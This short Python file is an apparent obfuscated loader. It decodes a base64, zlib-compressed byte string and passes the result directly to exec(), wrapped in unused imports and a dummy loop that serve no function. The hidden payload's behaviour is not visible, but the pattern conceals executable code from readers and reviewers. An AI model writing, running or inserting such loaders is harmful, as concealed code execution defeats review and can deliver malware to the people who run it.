import base64, codecs, zlib, lzma, gzip, bz2, marshal
_p = b'eJwtjjEOwjAMRfec4m9tIAMCsSA6cgUWxBApDrVUJchJQdyeNMnf7P/0bEceVsiOX3Z5NpiJX3PWF4US9qhrXCccEKW3dWzEFrGcCHe7rHQTiTIO75g484cQw/IbdCWF8iqh+3bdpFSO2S4oPuWLP7EjcMDjaHAyOD/blQbtp/bpBpmKavUHv8w5NA=='
_d = None
while True:
    _d = zlib.decompress(base64.b64decode(_p))
    break
exec(_d.decode())
